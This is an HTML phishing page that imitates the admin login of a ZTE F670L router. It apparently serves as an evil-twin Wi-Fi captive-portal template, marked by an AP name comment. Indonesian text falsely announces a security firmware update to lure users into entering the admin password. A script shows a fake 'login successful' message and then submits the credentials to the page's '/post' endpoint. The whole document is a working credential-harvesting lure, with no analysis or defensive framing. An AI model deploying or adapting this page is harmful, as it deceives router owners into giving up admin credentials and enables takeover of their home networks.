<!-- AP="ZTE-F670L-Admin" -->
<!DOCTYPE html>
<html>
<head>
  <title>ZTE F670L - Router Admin</title>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <style>
    body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:0;display:flex;align-items:center;justify-content:center;min-height:100vh;}
    .card{background:#fff;border-radius:4px;padding:30px;max-width:380px;width:90%;box-shadow:0 1px 6px rgba(0,0,0,0.12);}
    .header{background:#0d47a1;margin:-30px -30px 24px -30px;padding:20px 30px;border-radius:4px 4px 0 0;text-align:center;}
    .header h1{color:#fff;font-size:18px;margin:0;font-weight:400;}
    .header .model{color:#90caf9;font-size:13px;margin-top:4px;}
    .logo{text-align:center;margin-bottom:16px;}
    .logo svg{height:36px;}
    .input-group{margin-bottom:14px;}
    .input-group label{display:block;font-size:13px;color:#333;margin-bottom:4px;}
    .input-group input{width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:2px;font-size:14px;box-sizing:border-box;}
    .input-group input:focus{border-color:#1565c0;outline:none;box-shadow:0 0 4px rgba(21,101,192,0.3);}
    .btn-group{display:flex;gap:8px;margin-top:20px;}
    .btn{flex:1;padding:10px;border:none;border-radius:2px;font-size:14px;cursor:pointer;font-weight:600;}
    .btn-primary{background:#1565c0;color:#fff;}
    .btn-primary:hover{background:#0d47a1;}
    .btn-reset{background:#e0e0e0;color:#333;}
    .btn-reset:hover{background:#bdbdbd;}
    .info-bar{background:#e3f2fd;border-radius:2px;padding:10px 14px;margin-bottom:20px;font-size:12px;color:#1565c0;text-align:center;border:1px solid #bbdefb;}
    .version{text-align:center;font-size:11px;color:#999;margin-top:16px;}
    #form-block{display:block;}
    #success-block{display:none;text-align:center;padding:30px 0;}
    #success-block .check{font-size:40px;color:#2e7d32;}
    #success-block p{color:#333;font-size:15px;margin-top:8px;}
    .lang-select{text-align:right;margin-top:-10px;margin-bottom:10px;}
    .lang-select select{border:none;font-size:12px;color:#666;background:transparent;}
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <h1>ZTE F670L</h1>
      <div class="model">GPON ONT Terminal</div>
    </div>
    <div class="lang-select">
      <select><option>English</option><option selected>Bahasa Indonesia</option></select>
    </div>
    <div class="info-bar">
      Firmware update tersedia! Silakan login untuk melakukan pembaruan keamanan.
    </div>
    <div id="form-block">
      <form action='/post' id='login-form'>
        <div class="input-group">
          <label>Username</label>
          <input name='username' type='text' value='admin' placeholder='Username' required>
        </div>
        <div class="input-group">
          <label>Password</label>
          <input name='password' type='password' placeholder='Masukkan password admin' required>
        </div>
        <div class="btn-group">
          <button class="btn btn-reset" type="button">Reset</button>
          <button class="btn btn-primary" type="submit">Login</button>
        </div>
      </form>
      <div class="version">V2.19.1P1T1 | 192.168.1.1</div>
    </div>
    <div id="success-block">
      <div class="check">✓</div>
      <p>Login berhasil!</p>
      <p style="font-size:13px;color:#666;">Mengalihkan ke dashboard admin...</p>
    </div>
  </div>
  <script>
    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();
      document.getElementById('form-block').style.display = 'none';
      document.getElementById('success-block').style.display = 'block';
      setTimeout(function() { document.getElementById('login-form').submit(); }, 2500);
    });
  </script>
</body>
</html>
